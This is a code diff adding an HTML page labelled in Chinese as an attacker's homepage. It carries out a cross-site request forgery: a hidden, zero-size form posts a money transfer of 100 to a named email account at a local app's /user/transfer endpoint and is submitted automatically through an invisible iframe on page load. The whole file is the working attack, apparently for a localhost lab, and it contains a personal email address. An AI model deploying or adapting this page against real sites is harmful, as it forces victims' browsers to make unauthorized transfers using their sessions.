@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+    <title>Document</title>
+    <style>
+        #stealFrame {
+            width: 0px;
+            height: 0px
+        }
+
+        div, form {
+            background-color: aquamarine;
+            width: 0px;
+            height: 0px;
+        }
+    </style>
+</head>
+<body>
+    <h1>攻击者首页</h1>
+    <iframe id="stealFrame" src="" frameborder="0" style="width:0; height:0;"></iframe>
+    <div style="width:0; height:0;" width=0, height=0>
+        <form action="http://127.0.0.1:8000/user/transfer" method="post" id="myForm" style="width:0px; height:0px;">
+            <input type="text" name="username" value="mengqidlufei8932@gmail.com"/>
+            <input type="text" name="money" value="100">
+        </form>
+    </div>
+
+    <script>
+        window.onload = function(){
+            $('#stealFrame').contents().find('html').html($('#myForm'));
+            $('#stealFrame').contents().find('html').children('#myForm').submit();
+        }
+    </script>
+
+
+</body>
+</html>
